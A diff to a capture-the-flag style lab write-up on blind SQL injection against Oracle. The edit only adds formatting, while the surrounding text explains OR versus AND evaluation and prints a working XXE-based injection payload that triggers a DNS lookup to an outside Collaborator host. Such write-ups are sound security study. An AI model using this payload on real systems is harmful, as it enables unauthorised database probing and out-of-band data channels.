@@ -63,7 +63,7 @@ Oracle (worked)
 ![Lab Solution](images/image01.png)
 ![Lab Solved](images/image02.png)
 
-It worked this time due to the logical operation in the where clause. In the previous attempt the first criteria "trackingId=kzkJFv1M3CN3Aq4U" is always evaluated to true so there's no need to check the second criteria because the statement used was OR not AND. For that reason, the DNS lookup was never triggered. To prove this idea, I changed the trackingId to an invalid value and used the OR operator in the payload and it worked as well.
+It worked this time due to the logical operation in the where clause. In the previous attempt the first criteria `trackingId=kzkJFv1M3CN3Aq4U` is always evaluated to true so there's no need to check the second criteria because the statement used was OR not AND. For that reason, the DNS lookup was never triggered. To prove this idea, I changed the trackingId to an invalid value and used the OR operator in the payload and it worked as well.
 
 ```sql
 ...'kzkJFv1M3CN3Aq4U****'+OR+(Select+EXTRACTVALUE(xmltype('<?xml+version%3d"1.0"+encoding%3d"UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://abc.burpcollaborator.net">%25remote%3b]>'),'/l')+From+Dual)+IS+NULL--
